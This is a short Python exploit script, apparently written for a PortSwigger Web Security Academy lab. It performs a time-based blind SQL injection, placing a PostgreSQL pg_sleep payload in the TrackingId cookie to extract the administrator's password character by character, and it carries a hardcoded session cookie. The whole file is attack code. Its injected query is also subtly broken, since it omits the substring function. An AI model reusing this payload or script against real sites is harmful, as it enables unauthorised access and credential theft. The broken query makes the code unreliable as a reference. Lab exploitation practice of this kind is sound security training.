#!/usr/bin/python3
from pwn import *

import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

main_url = "http://0aed003f04b171d6c0d8733f007500a2.web-security-academy.net"
characters = string.ascii_lowercase + string.digits
 #string.printable cambiar

def makeRequest():
    
    password = ""
    
    p1 = log.progress("Brute force")
    p1.status("Initiating brute-force attack")
    
    time.sleep(2)
    
    p2 = log.progress("Password")
        
    for position in range(1, 21):
        for character in characters:
            
            cookies = {
                'TrackingId' : "SShXhd6uxRNk8MKi'||(select case when (password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
                'session' : 'NpzSjVIK9dUjtKxgyQkwEJLSKJ5uj6Gy'   
            }
            
            p1.status(cookies['TrackingId'])
            
            time_start = time.time()

            r = requests.get(main_url, cookies=cookies)
            
            time_end = time.time()

            if time_end - time_start > 1.5:
                password += character
                
                p2.status(password)
                
                break

if __name__ == '__main__':
    
     makeRequest()
   


